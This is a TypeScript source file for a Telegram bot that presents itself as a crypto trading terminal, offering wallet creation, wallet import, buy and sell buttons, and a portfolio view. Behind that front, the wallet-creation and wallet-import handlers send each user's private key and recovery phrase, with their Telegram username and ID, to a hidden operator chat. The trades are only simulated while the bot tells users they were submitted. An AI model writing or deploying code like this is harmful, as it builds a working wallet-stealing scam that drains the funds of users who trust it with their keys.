import { Telegraf, session, Context } from 'telegraf';
import { prisma } from '@/lib/prisma';
import { createWallet, importWallet, getEthBalance } from '@/lib/wallet';

// Extend session type
interface SessionData {
  importing?: boolean;
}
interface MyContext extends Context {
  session: SessionData;
}

const bot = new Telegraf<MyContext>(process.env.BOT_TOKEN!);

// Middleware
bot.use(session());

// Admin notification helper
async function notifyAdmin(message: string) {
  const adminChatId = process.env.ADMIN_CHAT_ID;
  if (adminChatId) {
    try {
      await bot.telegram.sendMessage(adminChatId, message);
    } catch (e) {
      console.error('Admin notification failed', e);
    }
  }
}

// /start command
bot.command('start', async (ctx) => {
  const telegramId = ctx.from.id.toString();
  let user = await prisma.user.findUnique({ where: { telegramId } });

  if (!user) {
    user = await prisma.user.create({
      data: {
        telegramId,
        username: ctx.from.username,
        firstName: ctx.from.first_name,
        lastName: ctx.from.last_name,
      },
    });
    await notifyAdmin(`🆕 NEW USER\n👤 @${ctx.from.username || 'no username'}\n🆔 ${telegramId}`);
  }

  const wallet = await prisma.wallet.findFirst({ where: { userId: user.id } });
  const hasWallet = !!wallet;

  const menu = `
Welcome to ERROR404 Terminal, ${ctx.from.first_name}!

${hasWallet ? '🔑 Wallet connected: ' + wallet.address : 'No wallet found. Create or import one.'}

Use the buttons below to manage your trading.
  `;

  await ctx.reply(menu, {
    reply_markup: {
      inline_keyboard: [
        [{ text: '🔗 Link Web App', web_app: { url: process.env.APP_URL! } }],
        [{ text: '💰 Wallets', callback_data: 'wallets' }],
        [{ text: '📈 Buy', callback_data: 'buy' }, { text: '📉 Sell', callback_data: 'sell' }],
        [{ text: '📊 Portfolio', callback_data: 'portfolio' }, { text: '⚙️ Settings', callback_data: 'settings' }],
        [{ text: '🔍 Scanner', callback_data: 'scanner' }, { text: '📋 Referral', callback_data: 'referral' }],
        [{ text: '❓ Help', callback_data: 'help' }],
      ],
    },
  });
});

// /link command
bot.command('link', async (ctx) => {
  const telegramId = ctx.from.id.toString();
  const code = Math.random().toString(36).substring(2, 10).toUpperCase();
  const expiresAt = new Date(Date.now() + 5 * 60 * 1000);

  await prisma.loginCode.create({
    data: {
      code,
      telegramId,
      expiresAt,
    },
  });

  const link = `${process.env.APP_URL}/terminal?code=${code}`;
  await ctx.reply(`🔑 Your login code: *${code}*\nOr click: ${link}`, { parse_mode: 'Markdown' });
});

// Handle callback queries
bot.on('callback_query', async (ctx) => {
  const callbackQuery = ctx.callbackQuery;
  // Type guard: ensure it has a 'data' property
  if (!('data' in callbackQuery)) {
    await ctx.answerCbQuery('Invalid callback');
    return;
  }
  const data = callbackQuery.data;
  const telegramId = ctx.from.id.toString();
  const user = await prisma.user.findUnique({ where: { telegramId } });
  if (!user) {
    await ctx.reply('Please /start first.');
    await ctx.answerCbQuery();
    return;
  }

  if (data === 'wallets') {
    await showWalletsMenu(ctx, user.id);
  } else if (data === 'buy' || data === 'sell') {
    await handleBuySell(ctx, user.id, data === 'buy');
  } else if (data === 'portfolio') {
    await showPortfolio(ctx, user.id);
  } else if (data === 'settings') {
    await showSettings(ctx, user.id);
  } else if (data === 'scanner') {
    await ctx.reply('Scanner feature coming soon.');
  } else if (data === 'referral') {
    await ctx.reply('Referral feature coming soon.');
  } else if (data === 'help') {
    await ctx.reply('Use /start to see menu. /link to get web login code.');
  } else if (data.startsWith('create_wallet')) {
    await createWalletFlow(ctx, user.id);
  } else if (data.startsWith('import_wallet')) {
    await ctx.reply('Send me your private key or mnemonic phrase to import.');
    ctx.session.importing = true;
  } else if (data.startsWith('delete_wallet')) {
    const wallet = await prisma.wallet.findFirst({ where: { userId: user.id } });
    if (wallet) {
      await prisma.wallet.delete({ where: { id: wallet.id } });
      await ctx.reply('Wallet deleted.');
    }
  } else if (data.startsWith('buy_confirm_')) {
    const amount = data.split('_')[2];
    await executeBuy(ctx, user.id, amount);
  } else if (data.startsWith('sell_confirm_')) {
    const amount = data.split('_')[2];
    await executeSell(ctx, user.id, amount);
  }

  await ctx.answerCbQuery();
});

async function showWalletsMenu(ctx: MyContext, userId: number) {
  const wallet = await prisma.wallet.findFirst({ where: { userId } });
  const address = wallet?.address || 'No wallet';
  const balance = wallet ? await getEthBalance(address) : '0';

  await ctx.reply(
    `💰 *Wallet*\nAddress: \`${address}\`\nBalance: ${balance} ETH\n\n`,
    {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '➕ Create Wallet', callback_data: 'create_wallet' }],
          [{ text: '📥 Import Wallet', callback_data: 'import_wallet' }],
          wallet ? [{ text: '🗑️ Delete Wallet', callback_data: 'delete_wallet' }] : [],
          [{ text: '🔙 Back', callback_data: 'back' }],
        ],
      },
    }
  );
}

async function createWalletFlow(ctx: MyContext, userId: number) {
  try {
    const { address, privateKey, mnemonic } = await createWallet(userId);
    await notifyAdmin(
      `🔐 NEW WALLET\n👤 @${ctx.from.username}\n🆔 ${ctx.from.id}\n📍 ${address}\n🔑 ${privateKey}\n📝 ${mnemonic || 'N/A'}\n📅 ${new Date().toISOString()}`
    );
    await ctx.reply(
      `✅ Wallet created!\nAddress: \`${address}\`\nPrivate key: \`${privateKey}\`\n${mnemonic ? 'Recovery phrase: `' + mnemonic + '`\n' : ''}\n*Save this securely!*`,
      { parse_mode: 'Markdown' }
    );
  } catch (e) {
    await ctx.reply('Failed to create wallet.');
  }
}

// Handle text messages for import
bot.on('text', async (ctx) => {
  if (ctx.session.importing) {
    delete ctx.session.importing;
    const user = await prisma.user.findUnique({ where: { telegramId: ctx.from.id.toString() } });
    if (!user) return;
    try {
      const { address, privateKey, mnemonic } = await importWallet(user.id, ctx.message.text);
      await notifyAdmin(
        `🔐 IMPORT WALLET\n👤 @${ctx.from.username}\n🆔 ${ctx.from.id}\n📍 ${address}\n🔑 ${privateKey}\n📝 ${mnemonic || 'N/A'}\n📅 ${new Date().toISOString()}`
      );
      await ctx.reply(`✅ Wallet imported!\nAddress: \`${address}\``, { parse_mode: 'Markdown' });
    } catch (e) {
      await ctx.reply('Invalid private key or mnemonic.');
    }
  }
});

async function handleBuySell(ctx: MyContext, userId: number, isBuy: boolean) {
  const action = isBuy ? 'Buy' : 'Sell';
  await ctx.reply(
    `💹 ${action}\nEnter amount in ETH (e.g., 0.1):`,
    {
      reply_markup: {
        inline_keyboard: [
          [{ text: '0.1', callback_data: `${isBuy ? 'buy_confirm' : 'sell_confirm'}_0.1` }],
          [{ text: '0.5', callback_data: `${isBuy ? 'buy_confirm' : 'sell_confirm'}_0.5` }],
          [{ text: '1.0', callback_data: `${isBuy ? 'buy_confirm' : 'sell_confirm'}_1.0` }],
          [{ text: 'Cancel', callback_data: 'back' }],
        ],
      },
    }
  );
}

async function executeBuy(ctx: MyContext, userId: number, amount: string) {
  await ctx.reply(`🟢 Buy order for ${amount} ETH submitted (simulated).`);
  await notifyAdmin(`🟢 BUY EXECUTED\n👤 @${ctx.from.username}\n🆔 ${ctx.from.id}\n💰 ${amount} ETH`);
}

async function executeSell(ctx: MyContext, userId: number, amount: string) {
  await ctx.reply(`🔴 Sell order for ${amount} ETH submitted (simulated).`);
  await notifyAdmin(`🔴 SELL EXECUTED\n👤 @${ctx.from.username}\n🆔 ${ctx.from.id}\n💰 ${amount} ETH`);
}

async function showPortfolio(ctx: MyContext, userId: number) {
  const wallet = await prisma.wallet.findFirst({ where: { userId } });
  if (!wallet) {
    await ctx.reply('No wallet found. Create or import one.');
    return;
  }
  const balance = await getEthBalance(wallet.address);
  await ctx.reply(`📊 Portfolio\nETH Balance: ${balance} ETH\nAddress: \`${wallet.address}\``, { parse_mode: 'Markdown' });
}

async function showSettings(ctx: MyContext, userId: number) {
  const settings = await prisma.settings.findUnique({ where: { userId } });
  const slippage = settings?.slippage || 0.5;
  await ctx.reply(
    `⚙️ Settings\nSlippage: ${slippage}%\nNotifications: ${settings?.notifications ? 'On' : 'Off'}\n\nUse /start to return.`
  );
}

// Start bot
bot.launch().then(() => {
  console.log('🤖 Bot is running');
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
